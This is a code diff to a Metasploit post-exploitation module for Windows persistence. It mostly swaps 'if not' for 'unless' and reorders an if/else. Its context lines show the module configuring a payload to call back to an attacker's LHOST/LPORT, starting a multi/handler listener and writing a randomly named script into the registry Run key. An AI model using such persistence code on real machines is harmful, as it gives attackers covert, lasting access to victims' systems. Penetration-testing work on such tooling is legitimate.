@@ -90,11 +90,11 @@ class Metasploit3 < Msf::Post
     if datastore['ACTION'] == 'TEMPLATE'
       # Check that if a template is provided that it actually exists
       if datastore['TEMPLATE']
-        if not ::File.exists?(datastore['TEMPLATE'])
+        if ::File.exists?(datastore['TEMPLATE'])
+          template_pe = datastore['TEMPLATE']
+        else
           print_error "Template PE File does not exists!"
           return
-        else
-          template_pe = datastore['TEMPLATE']
         end
       end
 
@@ -124,7 +124,7 @@ class Metasploit3 < Msf::Post
         return
       end
 
-      if not ::File.exist?(datastore['REXE'])
+      unless ::File.exist?(datastore['REXE'])
         print_error("Rexe file does not exist!")
         return
       end
@@ -205,7 +205,7 @@ class Metasploit3 < Msf::Post
     pay = session.framework.payloads.create(name)
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
-    if not opts.empty?
+    unless opts.empty?
       opts.split(",").each do |o|
         opt,val = o.split("=", 2)
         pay.datastore[opt] = val
@@ -219,7 +219,7 @@ class Metasploit3 < Msf::Post
   # Function for Creating persistent script
   #-------------------------------------------------------------------------------
   def create_script(delay, altexe, raw)
-    if not altexe.nil?
+    unless altexe.nil?
       vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw,
                                             {:persist => true, :delay => delay, :template => altexe})
     else
@@ -297,7 +297,7 @@ class Metasploit3 < Msf::Post
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
     print_status("Starting exploit multi handler")
-    if not check_for_listner(lhost, lport)
+    unless check_for_listner(lhost, lport)
       # Set options for module
       mul = session.framework.exploits.create("multi/handler")
       mul.share_datastore(pay.datastore)
@@ -337,7 +337,7 @@ class Metasploit3 < Msf::Post
     nam = Rex::Text.rand_text_alpha(rand(8)+8)
     key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
     print_status("Installing into autorun as #{key_path}\\#{nam}")
-    if (key)
+    if key
       registry_setvaldata("#{key_path}", nam, script_on_target, "REG_SZ")
       print_good("Installed into autorun as #{key_path}\\#{nam}")
     else
